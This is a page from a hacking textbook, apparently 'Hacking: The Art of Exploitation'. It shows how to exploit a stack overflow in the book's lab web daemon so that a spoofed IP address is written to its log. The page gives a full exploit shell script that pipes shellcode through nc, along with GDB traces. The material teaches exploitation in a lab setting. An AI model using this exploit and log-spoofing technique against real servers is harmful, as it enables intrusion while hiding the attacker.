<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x661 Spoofing the Logged IP Address</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part143.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part145.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark131">0x661 Spoofing the Logged IP Address</a></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">The IP address written to the log file comes from the <span class="s31">client_addr_ptr</span>, which is passed to <span class="s31">handle_connection()</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s40" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Code Segment from tinywebd.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1059.png"/></span></p><p class="s31" style="padding-left: 32pt;text-indent: -12pt;text-align: left;">void handle_connection(int sockfd, struct sockaddr_in *<b>client_addr_ptr</b>, int logfd) { unsigned char *ptr, request[500], resource[500], log_buffer[500];</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">int fd, length;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">length = recv_line(sockfd, request);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 12pt;text-align: left;">sprintf(log_buffer, &quot;From %s:%d \&quot;%s\&quot;\t&quot;, inet_ntoa(<b>client_addr_ptr-&gt;sin_addr</b>), ntohs(<b>client_addr_ptr-&gt;sin_port</b>), request);</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1060.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">To spoof the IP address, we just need to inject our own <span class="s31">sockaddr_in </span>structure and overwrite the <span class="s31">client_addr_ptr </span>with the address of the injected structure. The best way to generate a <span class="s31">sockaddr_in </span>structure for injection is to write a little C program that creates and dumps the structure. The following source code builds the struct using command-line arguments and then writes the struct data directly to file descriptor 1, which is standard output.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">addr_struct.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1061.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/socket.h&gt; #include &lt;netinet/in.h&gt;</p><p class="s31" style="padding-left: 104pt;text-indent: -12pt;line-height: 107%;text-align: left;">int main(int argc, char *argv[]) { struct sockaddr_in addr; if(argc != 3) {</p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;line-height: 107%;text-align: left;">printf(&quot;Usage: %s &lt;target IP&gt; &lt;target port&gt;\n&quot;, argv[0]); exit(0);</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 10pt;text-align: left;">}</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">addr.sin_family = AF_INET; addr.sin_port = htons(atoi(argv[2]));</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">addr.sin_addr.s_addr = inet_addr(argv[1]);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 104pt;text-indent: 0pt;text-align: left;">write(1, &amp;addr, sizeof(struct sockaddr_in));</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1062.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">This program can be used to inject a <span class="s31">sockaddr_in </span>structure. The output below shows the program being compiled and executed.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1063.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -o addr_struct addr_struct.c reader@hacking:~/booksrc $ ./addr_struct 12.34.56.78 9090 ##</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">&quot;8N_reader@hacking:~/booksrc $</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./addr_struct 12.34.56.78 9090 | hexdump -C 00000000 02 00 23 82 0c 22 38 4e 00 00 00 00 f4 5f fd b7 |.#.&quot;8N..._.|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000010</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1064.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">To integrate this into our exploit, the address structure is injected after the fake request but before the NOP sled. Since the fake request is 15 bytes long and we know the buffer starts at <span class="s31">0xbffff5c0</span>, the fake address will be injected at <span class="s31">0xbfffff5cf</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1065.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~/booksrc $ grep 0x xtool_tinywebd_steath.sh RETADDR=&quot;\x24\xf6\xff\xbf&quot; # at +100 bytes from buffer @ 0xbffff5c0 reader@hacking:~/booksrc $ gdb -q -batch -ex &quot;p /x 0xbffff5c0 + 15&quot;</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">$1 = 0xbffff5cf reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1066.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;">Since the <span class="s31">client_addr_ptr </span>is passed as a second function argument, it will be on the stack two dwords after the return address. The following exploit script injects a fake address structure and overwrites <span class="s31">client_addr_ptr</span>.</p><p class="s40" style="padding-top: 9pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">xtool_tinywebd_spoof.sh</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1067.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">#!/bin/sh</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;"># IP spoofing stealth exploitation tool for tinywebd</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">SPOOFIP=&quot;12.34.56.78&quot; SPOOFPORT=&quot;9090&quot;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: -12pt;line-height: 106%;text-align: left;">if [ -z &quot;$2&quot; ]; then # If argument 2 is blank echo &quot;Usage: $0 &lt;shellcode file&gt; &lt;target IP&gt;&quot; exit</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">fi</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">FAKEREQUEST=&quot;GET / HTTP/1.1\x00&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">FR_SIZE=$(perl -e &quot;print \&quot;$FAKEREQUEST\&quot;&quot; | wc -c | cut -f1 -d &#39; &#39;) OFFSET=540</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">RETADDR=&quot;\x24\xf6\xff\xbf&quot; # At +100 bytes from buffer @ 0xbffff5c0 FAKEADDR=&quot;\xcf\xf5\xff\xbf&quot; # +15 bytes from buffer @ 0xbffff5c0 echo &quot;target IP: $2&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">SIZE=`wc -c $1 | cut -f1 -d &#39; &#39;` echo &quot;shellcode: $1 ($SIZE bytes)&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">echo &quot;fake request: \&quot;$FAKEREQUEST\&quot; ($FR_SIZE bytes)&quot; ALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE - 16))</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">echo &quot;[Fake Request $FR_SIZE] [spoof IP 16] [NOP $ALIGNED_SLED_SIZE] [shellcode $SIZE] [ret addr 128] [*fake_addr 8]&quot;</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">(perl -e &quot;print \&quot;$FAKEREQUEST\&quot;&quot;;</p><p class="s31" style="padding-left: 23pt;text-indent: 0pt;text-align: left;">./addr_struct &quot;$SPOOFIP&quot; &quot;$SPOOFPORT&quot;;</p><p class="s31" style="padding-left: 23pt;text-indent: 0pt;line-height: 107%;text-align: left;">perl -e &quot;print \&quot;\x90\&quot;x$ALIGNED_SLED_SIZE&quot;; cat $1;</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">perl -e &quot;print \&quot;$RETADDR\&quot;x32 . \&quot;$FAKEADDR\&quot;x2 . \&quot;\r\n\&quot;&quot;) | nc -w 1 -v $2 80</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1068.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The best way to explain exactly what this exploit script does is to watch tinywebd from within GDB. In the output below, GDB is used to attach to the running tinywebd process, breakpoints are set before the overflow, and the IP portion of the log buffer is generated.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1069.png"/></span></p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ps aux | grep tinywebd</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:34pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">root</p></td><td style="width:77pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">27264 0.0 0.0</p></td><td style="width:30pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">1636</p></td><td style="width:53pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">420 ?</p></td><td style="width:23pt"><p class="s42" style="padding-left: 7pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">Ss</p></td><td style="width:34pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">20:47</p></td><td style="width:85pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0:00 ./tinywebd</p></td></tr><tr style="height:10pt"><td style="width:34pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">reader</p></td><td style="width:77pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">30648 0.0 0.0</p></td><td style="width:30pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">2880</p></td><td style="width:53pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">748 pts/2</p></td><td style="width:23pt"><p class="s42" style="padding-left: 7pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">R+</p></td><td style="width:34pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">22:29</p></td><td style="width:85pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0:00 grep tinywebd</p></td></tr></table><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -g tinywebd.c reader@hacking:~/booksrc $ sudo gdb -q—pid=27264 --symbols=./a.out</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">warning: not using untrusted file &quot;/home/reader/.gdbinit&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. Attaching to process 27264</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">/cow/home/reader/booksrc/tinywebd: No such file or directory. A program is being debugged already. Kill it? (y or n) n Program not killed.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) list handle_connection</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">77   /* This function handles the connection on the passed socket from the</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">78    * passed client address and logs to the passed FD. The connection is</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">79    * processed as a web request, and this function replies over the connected</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">80   * socket. Finally, the passed socket is closed at the end of the function.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">81   */</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">82   void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd) {</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">83     unsigned char *ptr, request[500], resource[500], log_buffer[500];</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">84    int fd, length; 85</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">86     length = recv_line(sockfd, request); (gdb)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">87</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">88    sprintf(log_buffer, &quot;From %s:%d \&quot;%s\&quot;\t&quot;, inet_ntoa(client_addr_ptr-&gt;sin_addr), ntohs(client_addr_ptr-&gt;sin_port), request);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">89</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">90    ptr = strstr(request, &quot; HTTP/&quot;); // Search for valid looking request.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">91    if(ptr == NULL) { // Then this isn&#39;t valid HTTP</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">92      strcat(log_buffer, &quot; NOT HTTP!\n&quot;);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">93    } else {</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">94      *ptr = 0; // Terminate the buffer at the end of the URL.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">95      ptr = NULL; // Set ptr to NULL (used to flag for an invalid request).</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">96      if(strncmp(request, &quot;GET &quot;, 4) == 0) // Get request (gdb) break 86</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1 at 0x8048fc3: file tinywebd.c, line 86. (gdb) break 89</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 2 at 0x8049028: file tinywebd.c, line 89. (gdb) cont</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">Continuing.</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1070.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Then, from another terminal, the new spoofing exploit is used to advance execution in the debugger.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1071.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./xtool_tinywebd_spoof.sh mark_restore 127.0.0.1 target IP: 127.0.0.1</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">shellcode: mark_restore (53 bytes)</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">fake request: &quot;GET / HTTP/1.1\x00&quot; (15 bytes)</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[Fake Request 15] [spoof IP 16] [NOP 332] [shellcode 53] [ret addr 128]</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*fake_addr 8]</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">localhost [127.0.0.1] 80 (www) open reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1072.png"/></span></p><p style="padding-top: 7pt;padding-left: 109pt;text-indent: 0pt;text-align: left;">Back in the debugging terminal, the first breakpoint is hit.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1073.png"/></span></p><p class="s31" style="padding-top: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1, handle_connection (sockfd=9, client_addr_ptr=0xbffff810, logfd=3) at tinywebd.c:86</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">86     length = recv_line(sockfd, request); (gdb) bt</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">#0 handle_connection (sockfd=9, client_addr_ptr=0xbffff810, logfd=3) at tinywebd.c:86 #1 0x08048fb7 in main () at tinywebd.c:72</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) print client_addr_ptr</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">$1 = (struct sockaddr_in *) 0xbffff810 (gdb) print *client_addr_ptr</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">$2 = {sin_family = 2, sin_port = 15284, sin_addr = {s_addr = 16777343}, sin_zero = &quot;\000\000\000\000\000\000\000&quot;}</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: justify;">(gdb) x/x &amp;client_addr_ptr 0xbffff7e4:   0xbffff810 (gdb) x/24x request + 500</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7b4:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff624</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff624</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff624</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xbffff624</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff7c4:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0xbffff624</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff624</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x0804b030</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0xbffff624</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7d4:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x00000009</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff848</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x08048fb7</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x00000009</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff7e4:</p></td><td style="width:66pt"><p class="s45" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0xbffff810</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x00000003</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff838</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0x00000004</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff7f4:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x00000000</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x00000000</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x08048a30</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0x00000000</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff804:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x0804a8c0</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff818</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x00000010</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0x3bb40002</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">(gdb) cont</p></td><td style="width:66pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:68pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:68pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:58pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:10pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Continuing.</p></td><td style="width:66pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:68pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:68pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:58pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 2, handle_connection (sockfd=-1073744433, client_addr_ptr=0xbffff5cf, logfd=2560) at tinywebd.c:90</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">90     ptr = strstr(request, &quot; HTTP/&quot;); // Search for valid-looking request. (gdb) x/24x request + 500</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: justify;">0xbffff7b4:   0xbffff624    0xbffff624    0xbffff624    0xbffff624 0xbffff7c4:   0xbffff624    0xbffff624    0xbffff624    0xbffff624 0xbffff7d4:   0xbffff624    0xbffff624    0xbffff624    0xbffff5cf <b>0xbffff7e4:   0xbffff5cf    </b>0x00000a00    0xbffff838    0x00000004 0xbffff7f4:   0x00000000    0x00000000    0x08048a30    0x00000000</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: justify;">0xbffff804:   0x0804a8c0   0xbffff818   0x00000010   0x3bb40002 (gdb) print client_addr_ptr</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">$3 = (struct sockaddr_in *) 0xbffff5cf (gdb) print client_addr_ptr</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$4 = (struct sockaddr_in *) 0xbffff5cf (gdb) print *client_addr_ptr</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$5 = {sin_family = 2, sin_port = 33315, sin_addr = {s_addr = 1312301580},</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">sin_zero = &quot;\000\000\000\000_ (gdb) x/s log_buffer</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffff1c0:    &quot;From 12.34.56.78:9090 \&quot;GET / HTTP/1.1\&quot;\t&quot; (gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1074.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">At the first breakpoint, <span class="s31">client_addr_ptr </span>is shown to be at <span class="s31">0xbffff7e4 </span>and pointing to <span class="s31">0xbffff810</span>. This is found in memory on the stack two dwords after the return address. The second breakpoint is after the overwrite, so the <span class="s31">client_addr_ptr </span>at <span class="s31">0xbffff7e4 </span>is shown to be overwritten with the address</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">of the injected <span class="s31">sockaddr_in </span>structure at <span class="s31">0xbffff5cf</span>. From here, we can peek at the <span class="s31">log_buffer </span>before it’s written out to the log to verify the address injection worked.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part143.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part145.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
